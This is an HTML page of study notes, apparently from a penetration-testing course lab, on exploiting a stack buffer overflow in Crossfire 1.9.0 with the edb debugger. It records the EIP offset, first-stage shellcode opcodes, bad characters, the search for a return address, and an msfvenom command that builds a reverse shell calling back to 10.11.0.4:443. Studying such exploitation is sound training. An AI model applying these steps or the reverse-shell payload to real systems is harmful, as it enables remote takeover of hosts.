<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Linux buffer overflow</title>
</head><body>Crossfire 1.9.0 is vullnerable to a network-based buffer overflow when passing a string of more than 2000 bytes to the setup sound command. <br/>
We will study this buffer overflow with evans debugger to debug Crossfire<br/>
Memory protection mechanisms on Linux kernels and compilers:<ul><li style="list-style-type: none">DEP: Data Execution Prevention</li>
<li style="list-style-type: none">ASLR: Address Space Layout Randomization</li>
<li style="list-style-type: none">Canaries: Stack Canaries</li>
</ul>
Since the bypass of these protection mechanisms is beyond the scope of studying this buffer overflow, the Crossfire executable we will work on has not been compiled with these mechanisms enabled<br/>
Replicating the crash: <ul><li style="list-style-type: none">We create the proof of concept python exploit code from information publicly available on the Internet</li>
<li style="list-style-type: none">A buffer of 4379 byte is proven to crash the application</li>
</ul>
Controlling the EIP:<ul><li style="list-style-type: none">msf-pattern_create -l 4379</li>
<li style="list-style-type: none">We update the python poc and run it again against Crossfire and we find with edb that the EIP has been overwritten with the following bytes: 46367046</li>
<li style="list-style-type: none">With msf-pattern_offset -q 46367046 we find that those byte are at offse 4368 of the buffer. We update then again the python poc and we verify our control of the EIP</li>
</ul>
Locating space for our shellcode:<ul><li style="list-style-type: none">The ESP points to the end of our buffer, but it only gives us 7 bytes for our shellcode, which is not enough</li>
<li style="list-style-type: none">Also, we cannot incrase the size of the buffer since, if we do it, we see that Crossfire starts crashing in an unpredictable way, not good for us</li>
<li style="list-style-type: none">We find that EAX points to the beginning of our buffer, including the "setup sound" command</li>
<li style="list-style-type: none">What we can try to do is to use the 7 bytes pointed by ESP to inject first stage shellcode. This fist stage payload will be used to align the EAX register in order to make it point to our buffer right after the setup sound string and then to jump to that location, skipping the first undesired instructions.</li>
<li style="list-style-type: none">In order to achieve this, our first stage shellcode will need to increase the value of EAX by 12 bytes, as there are 12 characters in the string "setup sound"</li>
<li style="list-style-type: none">We can accomplish this with an ADD assembly instruction and then jump to the memory pointed to by EAX with a JMP instruction. In order to get the orrect opcode for these instructions, we can use the nasm shell utility provided by metasploit: </li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">msf-nasm_shell</li>
<li style="list-style-type: none">nasm &gt; add eax, 12</li>
<li style="list-style-type: none">00000000 &#09;83C00C &#09;&#09;add eax, byte +0xc</li>
<li style="list-style-type: none">nasm &gt; jmp eax </li>
<li style="list-style-type: none">00000000 &#09;FFE0 &#09;&#09;jmp eax</li>
</ul>
</li>
<li style="list-style-type: none">Luckily for us, these two instructions only take 5 bytes of memory.</li>
<li style="list-style-type: none">We update our python poc by including the first stage shellcode and repadding the original buffer with nops, in order to maintain the correct lenght.</li>
<li style="list-style-type: none">Our updated poc code is working perfectly: the EIP is overwritten with 4 Bs and our first stage shellcode is located at the memory address pointed to by the ESP register</li>
</ul>
Checking for bad characters:<ul><li style="list-style-type: none">To find the list of bad characters for the Crossfire application, we send to it the complete set of characters (from 0x00 to 0xFF) and see if any of these bytes get changed, mangled, swapped or dropped by the application. This process is identical to the one followed during the development of a buffer overflow exploit under Windows. After doing that, we arrive to the conclusion that only \x00 and \x20 are bad characters for the Crossfire application </li>
</ul>
Finding a return address:<ul><li style="list-style-type: none">As a final step, we need to find a valid assembly instruction to redirect code execution to the memory location pointed to by the ESP register</li>
<li style="list-style-type: none">edb comes with a set of plugins, once of which is called "Opcode Searcher"</li>
<li style="list-style-type: none">Using this plugin we can easily search for a JUMP ESP instruction in the memory region where the code section of the Crossfire application is mapped. We proceed with the first JMP ESP instruction found by the debugger</li>
<li style="list-style-type: none">We can now update our python poc with the return address and run it. Indeed, we see that we land at our first stage shellcode, first stage that aligns the EAX with the dedired return address and then with the JMP EAX we land at our clean buffer of As. The only thing left to do is to insert a shellcode into out buffer of As</li>
</ul>
Getting a shell:<ul><li style="list-style-type: none">All we need to do now is to generate a reverse shell payload with msfvenom and drop it at the beginning of our buffer of As</li>
<li style="list-style-type: none">msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -b "\x00\x20" -f py -v shellcode</li>
<li style="list-style-type: none">We now setup our local nc listener on port 443 and se send our exploit... BINGO!</li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none">&nbsp;</li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none"></li>
</ul>
</body></html>